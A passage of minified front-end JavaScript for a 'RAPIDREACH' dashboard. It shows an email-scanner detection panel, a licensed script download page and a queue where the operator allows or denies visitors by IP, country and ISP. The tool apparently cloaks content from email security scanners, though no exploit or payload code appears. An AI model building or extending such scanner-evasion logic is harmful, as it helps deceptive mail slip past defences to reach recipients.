Guard",status:"Monitoring"}].map((d,u)=>a.jsxs("div",{className:"flex items-center gap-3 p-2 bg-slate-800/30 rounded-lg",children:[a.jsx(d.icon,{className:"w-4 h-4 text-cyan-400"}),a.jsx("span",{className:"font-jetbrains text-blue-200 text-sm flex-1",children:d.name}),a.jsx(Se,{className:"font-jetbrains bg-emerald-500/20 text-emerald-300 text-xs border-emerald-400/30",children:d.status})]},u))]}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("h4",{className:"font-jetbrains font-semibold text-cyan-300 uppercase tracking-wide text-sm",children:"Scanner Detection"}),a.jsxs("div",{className:"space-y-2",children:[Object.entries(t.scannerTypes).length>0?Object.entries(t.scannerTypes).map(([d,u])=>a.jsxs("div",{className:"flex justify-between text-sm",children:[a.jsx("span",{className:"font-jetbrains text-blue-300",children:d}),a.jsx("span",{className:"font-jetbrains text-emerald-300 font-medium",children:u})]},d)):a.jsx("div",{className:"font-jetbrains text-sm text-blue-300/70",children:"No email scanners detected recently"}),a.jsxs("div",{className:"mt-3 pt-3 border-t border-blue-500/20",children:[a.jsxs("div",{className:"flex justify-between text-sm",children:[a.jsx("span",{className:"font-jetbrains text-blue-300",children:"Detection Mode"}),a.jsx("span",{className:"font-jetbrains text-emerald-300 font-medium",children:"Enhanced"})]}),a.jsxs("div",{className:"flex justify-between text-sm",children:[a.jsx("span",{className:"font-jetbrains text-blue-300",children:"Response Time"}),a.jsx("span",{className:"font-jetbrains text-emerald-300 font-medium",children:"<50ms"})]})]})]})]})]})]})]})})},R4=()=>{const[t,e]=p.useState([]),[r,n]=p.useState(!0),[s,i]=p.useState(new Set);p.useEffect(()=>{o()},[]);const o=async()=>{try{n(!0);const{data:u,error:h}=await $.from("script_downloads").select("*").eq("is_active",!0).order("upload_date",{ascending:!1});if(h)throw h;e(u||[])}catch(u){console.error("Error fetching scripts:",u),be.error("Failed to load scripts")}finally{n(!1)}},l=async u=>{try{i(y=>new Set(y).add(u.id));const h=localStorage.getItem("license_session_token");if(!h){be.error("Session expired. Please login again.");return}const f=localStorage.getItem("license_session_expires");if(f&&new Date(f)<new Date){be.error("Session expired. Please login again."),localStorage.removeItem("license_session_token"),localStorage.removeItem("license_session_expires");return}const{data:m,error:g}=await $.storage.from("script-files").download(u.file_path);if(g){console.error("Storage download error:",g),g.message.includes("not found")?be.error("File not found or has been removed"):g.message.includes("permission")?be.error("Access denied. Please check your permissions."):be.error("Failed to download file from storage");return}const v=URL.createObjectURL(m),w=document.createElement("a");w.href=v,w.download=u.filename,document.body.appendChild(w),w.click(),document.body.removeChild(w),URL.revokeObjectURL(v);try{const{data:y,error:x}=await $.from("user_sessions").select("license_key_id").eq("session_token",h).eq("is_active",!0).single();if(x){console.error("Session validation error:",x),be.error("Session validation failed. Please login again.");return}if(y!=null&&y.license_key_id){const{error:b}=await $.rpc("log_script_download",{script_id_input:u.id,license_key_id_input:y.license_key_id,ip_address_input:null,user_agent_input:navigator.userAgent});b&&console.error("Download logging error:",b)}}catch(y){console.error("Download logging failed:",y)}be.success(`Downloaded ${u.display_name}`),o()}catch(h){console.error("Download error:",h),be.error("Failed to download script")}finally{i(h=>{const f=new Set(h);return f.delete(u.id),f})}},c=u=>{if(u===0)return"0 Bytes";const h=1024,f=["Bytes","KB","MB","GB"],m=Math.floor(Math.log(u)/Math.log(h));return parseFloat((u/Math.pow(h,m)).toFixed(2))+" "+f[m]},d=u=>{switch(u.toLowerCase()){case"cpanel":return"bg-blue-500/20 text-blue-300 border-blue-400/50";case"automation":return"bg-green-500/20 text-green-300 border-green-400/50";case"security":return"bg-red-500/20 text-red-300 border-red-400/50";case"utilities":return"bg-purple-500/20 text-purple-300 border-purple-400/50";default:return"bg-cyan-500/20 text-cyan-300 border-cyan-400/50"}};return r?a.jsxs("div",{className:"flex items-center justify-center p-8",children:[a.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-cyan-400"}),a.jsx("span",{className:"ml-3 text-cyan-300 font-jetbrains tracking-wider uppercase",children:"Loading Phantom Files..."})]}):a.jsxs("div",{className:"space-y-6",children:[a.jsxs("div",{className:"flex items-center gap-4 mb-6",children:[a.jsxs("div",{className:"relative",children:[a.jsx("div",{className:"absolute inset-0 bg-cyan-400/30 animate-pulse blur-sm rounded-xl"}),a.jsx("div",{className:"relative w-12 h-12 rounded-xl bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border border-cyan-400/30 backdrop-blur-sm flex items-center justify-center",children:a.jsx(Ai,{className:"w-6 h-6 text-cyan-300"})})]}),a.jsxs("div",{children:[a.jsx("h2",{className:"font-jetbrains text-2xl font-bold text-white tracking-wider uppercase",children:"PHANTOM DOWNLOADS"}),a.jsx("p",{className:"text-cyan-300/80 font-jetbrains tracking-wide uppercase text-sm",children:"SECURE FILE TRANSMISSION PROTOCOL"})]})]}),t.length===0?a.jsx(q,{className:"bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border-cyan-400/30",children:a.jsxs(X,{className:"p-6 text-center",children:[a.jsxs("div",{className:"relative mb-4",children:[a.jsx("div",{className:"absolute inset-0 bg-cyan-400/20 animate-pulse blur-md rounded-full"}),a.jsx(Xx,{className:"relative w-12 h-12 text-cyan-400/70 mx-auto"})]}),a.jsx("h3",{className:"font-jetbrains text-lg font-bold text-white mb-2 tracking-wider uppercase",children:"NO PHANTOM FILES DETECTED"}),a.jsx("p",{className:"text-cyan-300/70 font-jetbrains tracking-wide uppercase text-sm",children:"TRANSMISSION QUEUE EMPTY"})]})}):a.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3",children:t.map(u=>a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border-cyan-400/30 hover:border-cyan-400/60 transition-all duration-300 hover:shadow-lg hover:shadow-cyan-500/20 group overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent group-hover:animate-scan-line"}),a.jsx(fe,{className:"pb-2 p-3 relative z-10",children:a.jsxs("div",{className:"flex items-start justify-between gap-2",children:[a.jsxs("div",{className:"flex-1 min-w-0",children:[a.jsx(me,{className:"font-jetbrains text-xs text-white group-hover:text-cyan-300 transition-colors truncate tracking-wider uppercase",children:u.display_name}),a.jsxs(bt,{className:"text-cyan-300/80 font-jetbrains text-xs mt-1 truncate tracking-wider uppercase",children:["V",u.version]})]}),a.jsx(Se,{variant:"outline",className:`${d(u.category)} font-jetbrains text-xs flex-shrink-0 tracking-wider uppercase backdrop-blur-sm px-2 py-0`,children:u.category})]})}),a.jsxs(X,{className:"space-y-2 p-3 pt-0 relative z-10",children:[u.description&&a.jsx("div",{className:"bg-gradient-to-r from-slate-800/50 to-blue-900/50 border border-cyan-400/20 rounded-lg p-2",children:a.jsx("p",{className:"text-blue-200/90 text-xs font-inter leading-relaxed truncate",children:u.description})}),a.jsx("div",{className:"bg-gradient-to-r from-slate-800/50 to-blue-900/50 border border-cyan-400/20 rounded-lg p-2",children:a.jsxs("div",{className:"flex items-center justify-between text-xs",children:[a.jsxs("div",{className:"flex items-center gap-1 text-cyan-300/80",children:[a.jsx(Zx,{className:"w-3 h-3"}),a.jsx("span",{className:"font-jetbrains font-bold",children:c(u.file_size)})]}),a.jsxs("div",{className:"flex items-center gap-1 text-cyan-300/80",children:[a.jsx(bl,{className:"w-3 h-3"}),a.jsx("span",{className:"font-jetbrains font-bold",children:u.download_count})]}),a.jsxs("div",{className:"flex items-center gap-1 text-blue-300/80",children:[a.jsx(cr,{className:"w-3 h-3"}),a.jsx("span",{className:"font-jetbrains font-bold",children:new Date(u.upload_date).toLocaleDateString("en-US",{month:"short",day:"numeric"})})]})]})}),a.jsxs("div",{className:"relative group/btn",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 rounded-lg opacity-40 blur group-hover/btn:opacity-80 transition duration-300"}),a.jsx(W,{onClick:()=>l(u),disabled:s.has(u.id),className:"relative z-10 w-full bg-gradient-to-r from-cyan-600/80 to-blue-600/80 hover:from-cyan-500 hover:to-blue-500 text-white font-jetbrains font-bold transition-all duration-300 tracking-wider uppercase text-xs py-1 h-7",children:s.has(u.id)?a.jsxs(a.Fragment,{children:[a.jsx("div",{className:"animate-spin rounded-full h-3 w-3 border-b-2 border-white mr-2"}),"TRANSMITTING..."]}):a.jsxs(a.Fragment,{children:[a.jsx(yl,{className:"w-3 h-3 mr-2 group-hover/btn:animate-bounce"}),"DOWNLOAD"]})})]})]})]},u.id))})]})},I4=()=>{const[t,e]=p.useState([]),[r,n]=p.useState(!0),[s,i]=p.useState(new Set),o=async()=>{try{const m=localStorage.getItem("license_session_token");if(console.log("Session token:",m),!m){console.error("No session token found"),n(!1);return}const{data:g,error:v}=await $.rpc("get_manual_decisions_for_session",{session_token_input:m});if(console.log("Manual decisions data:",g),console.log("Manual decisions error:",v),v){console.error("Error fetching manual decisions:",v);return}e(g||[])}catch(m){console.error("Error:",m)}finally{n(!1)}},l=async(m,g)=>{var w;const v=`${m}_${g}`;if(s.has(v)){console.log("Decision already being processed:",v);return}console.log("Starting decision process:",{decisionKey:m,decision:g,processKey:v}),i(y=>new Set([...y,v]));try{const y=localStorage.getItem("license_session_token");if(!y){console.error("No session token found"),be.error("No session token found");return}console.log("Calling API with:",{sessionToken:y,decision:g,decisionKey:m});const x=await $.functions.invoke("req-p7v4n1",{body:{sessionToken:y,decision:g,decisionKey:m,visitorData:{ip:"user_dashboard"}}});if(console.log("API Response:",x),x.error){console.error("Decision update error:",x.error),be.error("Failed to update decision");return}if(!x.data){console.error("No response data"),be.error("Failed to update decision");return}if(!x.data.success){console.error("Decision update failed:",x.data),be.error(((w=x.data)==null?void 0:w.error)||"Failed to update decision");return}console.log("Decision updated successfully"),e(b=>b.map(j=>j.decision_key===m?{...j,decision:g}:j)),be.success(`Visitor ${g==="allow"?"allowed":"denied"}`,{duration:2e3}),setTimeout(()=>{o()},1e3)}catch(y){console.error("Error updating decision:",y),be.error("Failed to update decision")}finally{console.log("Clearing processing state for:",v),i(y=>{const x=new Set(y);return x.delete(v),console.log("New processing decisions:",x),x})}},c=m=>!m||m.length!==2?"":String.fromCodePoint(...m.toUpperCase().split("").map(g=>127462+g.charCodeAt(0)-65)),d=m=>m?m.includes("Chrome")&&!m.includes("Edg")?"Chrome":m.includes("Firefox")?"Firefox":m.includes("Safari")&&!m.includes("Chrome")?"Safari":m.includes("Edg")?"Edge":m.includes("Opera")?"Opera":"Unknown Browser":"Unknown Browser",u=m=>{const g=new Date,v=new Date(m),w=g.getTime()-v.getTime(),y=Math.floor(w/6e4);if(y<1)return"Just now";if(y<60)return`${y}m ago`;const x=Math.floor(y/60);return x<24?`${x}h ago`:`${Math.floor(x/24)}d ago`};if(p.useEffect(()=>{o();const m=setInterval(()=>{s.size===0&&o()},5e3);return()=>clearInterval(m)},[s]),r)return a.jsxs(q,{children:[a.jsx(fe,{children:a.jsxs(me,{className:"flex items-center gap-2",children:[a.jsx(ct,{className:"w-5 h-5"}),"Pending Decisions"]})}),a.jsx(X,{children:a.jsxs("div",{className:"text-center py-8",children:[a.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"}),a.jsx("p",{className:"text-muted-foreground mt-2",children:"Loading pending decisions..."})]})})]});const h=t.filter(m=>m.decision==="pending"),f=t.filter(m=>m.decision!=="pending").slice(0,5);return a.jsxs("div",{className:"space-y-6",children:[a.jsxs(q,{children:[a.jsx(fe,{children:a.jsxs(me,{className:"flex items-center gap-2",children:[a.jsx(ct,{className:"w-5 h-5 text-yellow-500"}),"Pending Manual Decisions",h.length>0&&a.jsx(Se,{variant:"destructive",children:h.length})]})}),a.jsx(X,{children:h.length===0?a.jsxs("div",{className:"text-center py-8",children:[a.jsx(ba,{className:"w-12 h-12 text-green-500 mx-auto mb-3"}),a.jsx("p",{className:"text-muted-foreground",children:"No pending decisions"})]}):a.jsx("div",{className:"space-y-4",children:h.map((m,g)=>{var v,w,y,x,b,j,_,N;return a.jsxs("div",{className:`
                     border border-yellow-200 bg-yellow-50 dark:bg-yellow-900/20 dark:border-yellow-800 
                     rounded-lg p-4 transition-all duration-300 hover:shadow-md
                     animate-fade-in opacity-0
                   `,style:{animationDelay:`${g*100}ms`,animationFillMode:"forwards"},children:[a.jsxs("div",{className:"flex justify-between items-start mb-3",children:[a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(Yj,{className:"w-4 h-4 text-gray-500"}),a.jsx("span",{className:"font-mono text-sm",children:((v=m.visitor_data)==null?void 0:v.ip)||"Unknown IP"}),a.jsx("span",{className:"text-lg",children:c((y=(w=m.visitor_data)==null?void 0:w.locationData)==null?void 0:y.country_code)}),a.jsx("span",{className:"text-sm text-gray-600",children:((b=(x=m.visitor_data)==null?void 0:x.locationData)==null?void 0:b.country_name)||"Unknown"})]}),a.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-500",children:[a.jsx(cr,{className:"w-4 h-4"}),u(m.created_at)]})]}),a.jsxs("div",{className:"flex items-center gap-2 mb-4",children:[a.jsx(Jj,{className:"w-4 h-4 text-gray-500"}),a.jsx("span",{className:"text-sm text-gray-600",children:d(((j=m.visitor_data)==null?void 0:j.userAgent)||"")}),a.jsxs("span",{className:"text-sm text-gray-500",children:[" ",((N=(_=m.visitor_data)==null?void 0:_.locationData)==null?void 0:N.isp)||"Unknown ISP"]})]}),a.jsxs("div",{className:"flex gap-2",children:[a.jsxs(W,{size:"sm",className:"bg-green-600 hover:bg-green-700 transition-all duration-200",onClick:()=>l(m.decision_key,"allow"),disabled:s.has(`${m.decision_key}_allow`),children:[s.has(`${m.decision_key}_allow`)?a.jsx("div",{className:"animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent mr-1"}):a.jsx(ba,{className:"w-4 h-4 mr-1"}),s.has(`${m.decision_key}_allow`)?"Processing...":"Allow"]}),a.jsxs(W,{size:"sm",variant:"destructive",className:"transition-all duration-200",onClick:()=>l(m.decision_key,"deny"),disabled:s.has(`${m.decision_key}_deny`),children:[s.has(`${m.decision_key}_deny`)?a.jsx("div",{className:"animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent mr-1"}):a.jsx(Vo,{className:"w-4 h-4 mr-1"}),s.has(`${m.decision_key}_deny`)?"Processing...":"Deny"]})]})]},m.id)})})})]}),f.length>0&&a.jsxs(q,{children:[a.jsx(fe,{children:a.jsxs(me,{className:"flex items-center gap-2",children:[a.jsx(cr,{className:"w-5 h-5"}),"Recent Decisions"]})}),a.jsx(X,{children:a.jsx("div",{className:"space-y-3",children:f.map(m=>{var g,v,w;return a.jsxs("div",{className:"flex justify-between items-center p-3 border rounded-lg",children:[a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx("span",{className:"font-mono text-sm",children:((g=m.visitor_data)==null?void 0:g.ip)||"Unknown IP"}),a.jsx("span",{children:c((w=(v=m.visitor_data)==null?void 0:v.locationData)==null?void 0:w.country_code)}),a.jsx(Se,{variant:m.decision==="allow"?"default":"destructive",className:m.decision==="allow"?"bg-green-100 text-green-800":"",children:m.decision})]}),a.jsx("span",{className:"text-sm text-gray-500",children:u(m.created_at)})]},m.id)})})})]})]})};function L4(t,e=[]){let r=[];function n(i,o){const l=p.createContext(o),c=r.length;r=[...r,o];function d(h){const{scope:f,children:m,...g}=h,v=(f==null?void 0:f[t][c])||l,w=p.useMemo(()=>g,Object.values(g));return a.jsx(v.Provider,{value:w,children:m})}function u(h,f){const m=(f==null?void 0:f[t][c])||l,g=p.useContext(m);if(g)return g;if(o!==void 0)return o;throw new Error(`\`${h}\` must be used within \`${i}\``)}return d.displayName=i+"Provider",[d,u]}const s=()=>{const i=r.map(o=>p.createContext(o));return function(l){const c=(l==null?void 0:l[t])||i;return p.useMemo(()=>({[`__scope${t}`]:{...l,[t]:c}}),[l,c])}};return s.scopeName=t,[n,M4(s,...e)]}function M4(...t){const e=t[0];if(t.length===1)return e;const r=()=>{const n=t.map(s=>({useScope:s(),scopeName:s.scopeName}));return function(i){const o=n.reduce((l,{useScope:c,scopeName:d})=>{const h=c(i)[`__scope${d}`];return{...l,...h}},{});return p.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return r.scopeName=e.scopeName,r}var O4=p.createContext(void 0);function Vv(t){const e=p.useContext(O4);return t||e||"ltr"}var ud="rovingFocusGroup.onEntryFocus",$4={bubbles:!1,cancelable:!0},xc="RovingFocusGroup",[Wu,Hv,U4]=_x(xc),[D4,Gv]=L4(xc,[U4]),[z4,F4]=D4(xc),Wv=p.forwardRef((t,e)=>a.jsx(Wu.Provider,{scope:t.__scopeRovingFocusGroup,children:a.jsx(Wu.Slot,{scope:t.__scopeRovingFocusGroup,children:a.jsx(B4,{...t,ref:e})})}));Wv.displayName=xc;var B4=p.forwardRef((t,e)=>{const{__scopeRovingFocusGroup:r,orientation:n,loop:s=!1,dir:i,currentTabStopId:o,defaultCurrentTabStopId:l,onCurrentTabStopIdChange:c,onEntryFocus:d,preventScrollOnEntryFocus:u=!1,...h}=t,f=p.useRef(null),m=Yt(e,f),g=Vv(i),[v=null,w]=Vh({prop:o,defaultProp:l,onChange:c}),[y,x]=p.useState(!1),b=ur(d),j=Hv(r),_=p.useRef(!1),[N,S]=p.useState(0);return p.useEffect(()=>{const k=f.current;if(k)return k.addEventListener(ud,b),()=>k.removeEventListener(ud,b)},[b]),a.jsx(z4,{scope:r,orientation:n,dir:g,loop:s,currentTabStopId:v,onItemFocus:p.useCallback(k=>w(k),[w]),onItemShiftTab:p.useCallback(()=>x(!0),[]),onFocusableItemAdd:p.useCallback(()=>S(k=>k+1),[]),onFocusableItemRemove:p.useCallback(()=>S(k=>k-1),[]),children:a.jsx(ze.div,{tabIndex:y||N===0?-1:0,"data-orientation":n,...h,ref:m,style:{outline:"none",...t.style},onMouseDown:Ne(t.onMouseDown,()=>{_.current=!0}),onFocus:Ne(t.onFocus,k=>{const C=!_.current;if(k.target===k.currentTarget&&C&&!y){const T=new CustomEvent(ud,$4);if(k.currentTarget.dispatchEvent(T),!T.defaultPrevented){const M=j().filter(K=>K.focusable),A=M.find(K=>K.active),R=M.find(K=>K.id===v),J=[A,R,...M].filter(Boolean).map(K=>K.ref.current);Qv(J,u)}}_.current=!1}),onBlur:Ne(t.onBlur,()=>x(!1))})})}),Kv="RovingFocusGroupItem",qv=p.forwardRef((t,e)=>{const{__scopeRovingFocusGroup:r,focusable:n=!0,active:s=!1,tabStopId:i,...o}=t,l=my(),c=i||l,d=F4(Kv,r),u=d.currentTabStopId===c,h=Hv(r),{onFocusableItemAdd:f,onFocusableItemRemove:m}=d;return p.useEffect(()=>{if(n)return f(),()=>m()},[n,f,m]),a.jsx(Wu.ItemSlot,{scope:r,id:c,focusable:n,active:s,children:a.jsx(ze.span,{tabIndex:u?0:-1,"data-orientation":d.orientation,...o,ref:e,onMouseDown:Ne(t.onMouseDown,g=>{n?d.onItemFocus(c):g.preventDefault()}),onFocus:Ne(t.onFocus,()=>d.onItemFocus(c)),onKeyDown:Ne(t.onKeyDown,g=>{if(g.key==="Tab"&&g.shiftKey){d.onItemShiftTab();return}if(g.target!==g.currentTarget)return;const v=G4(g,d.orientation,d.dir);if(v!==void 0){if(g.metaKey||g.ctrlKey||g.altKey||g.shiftKey)return;g.preventDefault();let y=h().filter(x=>x.focusable).map(x=>x.ref.current);if(v==="last")y.reverse();else if(v==="prev"||v==="next"){v==="prev"&&y.reverse();const x=y.indexOf(g.currentTarget);y=d.loop?W4(y,x+1):y.slice(x+1)}setTimeout(()=>Qv(y))}})})})});qv.displayName=Kv;var V4={ArrowLeft:"prev",ArrowUp:"prev",ArrowRight:"next",ArrowDown:"next",PageUp:"first",Home:"first",PageDown:"last",End:"last"};function H4(t,e){return e!=="rtl"?t:t==="ArrowLeft"?"ArrowRight":t==="ArrowRight"?"ArrowLeft":t}function G4(t,e,r){const n=H4(t.key,r);if(!(e==="vertical"&&["ArrowLeft","ArrowRight"].includes(n))&&!(e==="horizontal"&&["ArrowUp","ArrowDown"].includes(n)))return V4[n]}function Qv(t,e=!1){const r=document.activeElement;for(const n of t)if(n===r||(n.focus({preventScroll:e}),document.activeElement!==r))return}function W4(t,e){return t.map((r,n)=>t[(e+n)%t.length])}var K4=Wv,q4=qv,vf="Tabs",[Q4,GC]=Fh(vf,[Gv]),Yv=Gv(),[Y4,bf]=Q4(vf),Jv=p.forwardRef((t,e)=>{const{__scopeTabs:r,value:n,onValueChange:s,defaultValue:i,orientation:o="horizontal",dir:l,activationMode:c="automatic",...d}=t,u=Vv(l),[h,f]=Vh({prop:n,onChange:s,defaultProp:i});return a.jsx(Y4,{scope:r,baseId:my(),value:h,onValueChange:f,orientation:o,dir:u,activationMode:c,children:a.jsx(ze.div,{dir:u,"data-orientation":o,...d,ref:e})})});Jv.displayName=vf;var Xv="TabsList",Zv=p.forwardRef((t,e)=>{const{__scopeTabs:r,loop:n=!0,...s}=t,i=bf(Xv,r),o=Yv(r);return a.jsx(K4,{asChild:!0,...o,orientation:i.orientation,dir:i.dir,loop:n,children:a.jsx(ze.div,{role:"tablist","aria-orientation":i.orientation,...s,ref:e})})});Zv.displayName=Xv;var eb="TabsTrigger",tb=p.forwardRef((t,e)=>{const{__scopeTabs:r,value:n,disabled:s=!1,...i}=t,o=bf(eb,r),l=Yv(r),c=sb(o.baseId,n),d=ab(o.baseId,n),u=n===o.value;return a.jsx(q4,{asChild:!0,...l,focusable:!s,active:u,children:a.jsx(ze.button,{type:"button",role:"tab","aria-selected":u,"aria-controls":d,"data-state":u?"active":"inactive","data-disabled":s?"":void 0,disabled:s,id:c,...i,ref:e,onMouseDown:Ne(t.onMouseDown,h=>{!s&&h.button===0&&h.ctrlKey===!1?o.onValueChange(n):h.preventDefault()}),onKeyDown:Ne(t.onKeyDown,h=>{[" ","Enter"].includes(h.key)&&o.onValueChange(n)}),onFocus:Ne(t.onFocus,()=>{const h=o.activationMode!=="manual";!u&&!s&&h&&o.onValueChange(n)})})})});tb.displayName=eb;var rb="TabsContent",nb=p.forwardRef((t,e)=>{const{__scopeTabs:r,value:n,forceMount:s,children:i,...o}=t,l=bf(rb,r),c=sb(l.baseId,n),d=ab(l.baseId,n),u=n===l.value,h=p.useRef(u);return p.useEffect(()=>{const f=requestAnimationFrame(()=>h.current=!1);return()=>cancelAnimationFrame(f)},[]),a.jsx(Ql,{present:s||u,children:({present:f})=>a.jsx(ze.div,{"data-state":u?"active":"inactive","data-orientation":l.orientation,role:"tabpanel","aria-labelledby":c,hidden:!f,id:d,tabIndex:0,...o,ref:e,style:{...t.style,animationDuration:h.current?"0s":void 0},children:f&&i})})});nb.displayName=rb;function sb(t,e){return`${t}-trigger-${e}`}function ab(t,e){return`${t}-content-${e}`}var J4=Jv,ib=Zv,ob=tb,lb=nb;const wf=J4,yc=p.forwardRef(({className:t,...e},r)=>a.jsx(ib,{ref:r,className:we("flex h-12 sm:h-14 items-center justify-start rounded-xl bg-slate-800/80 backdrop-blur-lg border border-cyan-400/30 p-1 text-foreground shadow-lg shadow-blue-500/20","overflow-x-auto scrollbar-hidden w-full","scroll-smooth overscroll-x-contain","gap-0.5 sm:gap-1","[&::-webkit-scrollbar]:h-1","[&::-webkit-scrollbar-track]:bg-transparent","[&::-webkit-scrollbar-thumb]:bg-cyan-400/30","[&::-webkit-scrollbar-thumb]:rounded-full","relative","before:content-[''] before:absolute before:right-0 before:top-0 before:bottom-0 before:w-4 before:bg-gradient-to-l before:from-slate-800/80 before:to-transparent before:pointer-events-none before:z-10","after:content-[''] after:absolute after:left-0 after:top-0 after:bottom-0 after:w-4 after:bg-gradient-to-r after:from-slate-800/80 after:to-transparent after:pointer-events-none after:z-10",t),...e}));yc.displayName=ib.displayName;const ar=p.forwardRef(({className:t,...e},r)=>a.jsx(ob,{ref:r,className:we("inline-flex items-center justify-center whitespace-nowrap rounded-lg transition-all duration-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-cyan-400 focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50","text-slate-300 hover:text-white hover:bg-gradient-to-r hover:from-blue-600/20 hover:to-cyan-600/20","data-[state=active]:bg-gradient-to-r data-[state=active]:from-cyan-600 data-[state=active]:to-blue-600 data-[state=active]:text-white data-[state=active]:shadow-lg data-[state=active]:shadow-blue-500/25","px-2 py-2 text-xs font-jetbrains font-bold uppercase tracking-wider","sm:px-3 sm:py-2.5 sm:text-sm","min-w-[60px] sm:min-w-[80px] min-h-[40px] sm:min-h-[44px] touch-manipulation","flex-shrink-0","relative z-20",t),...e}));ar.displayName=ob.displayName;const ir=p.forwardRef(({className:t,...e},r)=>a.jsx(lb,{ref:r,className:we("mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2",t),...e}));ir.displayName=lb.displayName;const X4=()=>{const t=nv();return a.jsx(S4,{children:a.jsxs("div",{className:"min-h-screen w-full fixed inset-0 bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 bg-[length:400%_400%] animate-gradient-flow overflow-y-auto overflow-x-hidden",children:[a.jsxs("div",{className:"fixed inset-0 pointer-events-none overflow-hidden z-0",children:[a.jsx("div",{className:"absolute top-20 left-10 w-16 h-16 bg-blue-400/20 backdrop-blur-sm rounded-lg animate-float-1"}),a.jsx("div",{className:"absolute top-40 right-16 w-12 h-12 bg-indigo-400/20 backdrop-blur-sm rounded-full animate-float-2"}),a.jsx("div",{className:"absolute bottom-32 left-1/4 w-20 h-8 bg-purple-400/20 backdrop-blur-sm transform rotate-45 animate-float-1"}),a.jsx("div",{className:"absolute bottom-20 right-1/3 w-10 h-10 bg-teal-400/20 backdrop-blur-sm transform rotate-12 animate-float-2"}),a.jsx("div",{className:"absolute top-1/4 w-full h-px bg-gradient-to-r from-transparent via-blue-400/50 to-transparent animate-scan-line"}),a.jsx("div",{className:"absolute bottom-1/3 w-full h-px bg-gradient-to-r from-transparent via-indigo-400/50 to-transparent animate-scan-line",style:{animationDelay:"4s"}}),a.jsx("div",{className:"absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-32 h-32 border border-blue-400/30 rounded-full animate-radar-pulse"}),a.jsx("div",{className:"absolute inset-0 opacity-10 bg-[linear-gradient(90deg,transparent_24px,rgba(59,130,246,0.5)_25px,rgba(59,130,246,0.5)_26px,transparent_27px,transparent_49px,rgba(59,130,246,0.5)_50px,rgba(59,130,246,0.5)_51px,transparent_52px),linear-gradient(rgba(59,130,246,0.5)_24px,transparent_25px,transparent_26px,rgba(59,130,246,0.5)_27px,rgba(59,130,246,0.5)_49px,transparent_50px,transparent_51px,rgba(59,130,246,0.5)_52px)] bg-[size:52px_52px]"})]}),a.jsxs("div",{className:"relative z-10 w-full animate-fade-in",children:[a.jsx("header",{className:"pt-4 sm:pt-6 px-3 sm:px-4 md:px-6 lg:px-8",children:a.jsxs("div",{className:"max-w-7xl mx-auto flex justify-between items-center",children:[a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 min-w-0 flex-1",children:[a.jsxs("div",{className:"relative w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 flex-shrink-0",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/30 to-blue-500/30 rounded-full animate-pulse blur-sm"}),a.jsx("div",{className:"relative z-10 w-full h-full rounded-full bg-gradient-to-br from-cyan-400/20 to-blue-500/20 backdrop-blur-sm border border-cyan-400/30 flex items-center justify-center",children:a.jsx("span",{className:"text-base sm:text-lg md:text-2xl font-jetbrains font-bold text-cyan-300 animate-pulse drop-shadow-lg select-none",children:""})})]}),a.jsx("span",{className:"font-jetbrains text-sm sm:text-lg md:text-xl font-black bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent tracking-wider truncate drop-shadow-lg min-w-0",children:"RAPIDREACH"})]}),a.jsxs("div",{className:"relative group flex-shrink-0",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-blue-500 to-purple-500 rounded-xl opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:()=>t("/nexus"),variant:"outline",size:"sm",className:"relative z-10 h-8 sm:h-10 md:h-12 px-2 sm:px-4 md:px-6 flex items-center gap-1 sm:gap-2 md:gap-3 border-blue-400/40 hover:border-blue-300/60 bg-slate-800/50 hover:bg-slate-700/60 text-blue-200 hover:text-blue-100 transition-all duration-300 backdrop-blur-sm font-jetbrains font-semibold tracking-wide shadow-lg min-h-[44px] touch-manipulation",children:[a.jsx(ry,{className:"w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5"}),a.jsx("span",{className:"hidden xs:hidden sm:inline text-xs sm:text-sm md:text-base",children:"Settings"})]})]})]})}),a.jsxs("main",{className:"container mx-auto px-3 sm:px-4 md:px-6 lg:px-8 py-6 sm:py-8 md:py-12 lg:py-16",children:[a.jsxs("div",{className:"text-center mb-6 sm:mb-8 md:mb-12 lg:mb-16",children:[a.jsxs("div",{className:"inline-flex items-center gap-1 sm:gap-2 px-2 sm:px-3 md:px-4 py-1 sm:py-1.5 rounded-full bg-cyan-500/20 border border-cyan-400/30 text-cyan-300 text-xs sm:text-sm font-jetbrains font-medium mb-3 sm:mb-4 touch-manipulation",children:[a.jsx(Ri,{className:"w-2.5 h-2.5 sm:w-3 sm:h-3 md:w-3.5 